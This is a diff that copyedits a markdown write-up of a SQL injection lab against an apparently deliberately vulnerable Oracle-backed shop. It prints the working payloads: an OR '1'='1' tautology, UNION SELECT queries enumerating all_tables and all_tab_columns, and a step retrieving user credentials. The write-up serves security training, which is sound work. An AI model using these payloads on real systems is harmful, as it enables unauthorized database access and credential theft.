@@ -23,27 +23,27 @@ Like the other labs, the target is an e-commerce site with a vulnerable category
 
 ## Exploitation
 
-First we confirm SQL injection with:
+First, we confirm SQL injection with:
 
 ```sql
 ' OR '1'='1' --
 ```
 
-That makes the app return unrelated results and proves the parameter is injectable.
+That makes the app return unrelated results and proves that the parameter is injectable.
 
-To enumerate Oracle tables we use:
+To enumerate Oracle tables, we use:
 
 ```sql
 ' UNION SELECT table_name, NULL FROM all_tables --
 ```
 
-Then inspect the columns for the interesting table:
+Then we inspect the columns for the interesting table:
 
 ```sql
 ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_GDXCML' --
 ```
 
-Finally we retrieve credentials from the relevant columns and solve the lab.
+Finally, we retrieve the credentials from the relevant columns and solve the lab.
 
 ![Lab 6 table enumeration](../assets/sqli/lab6/6-2.png)
 
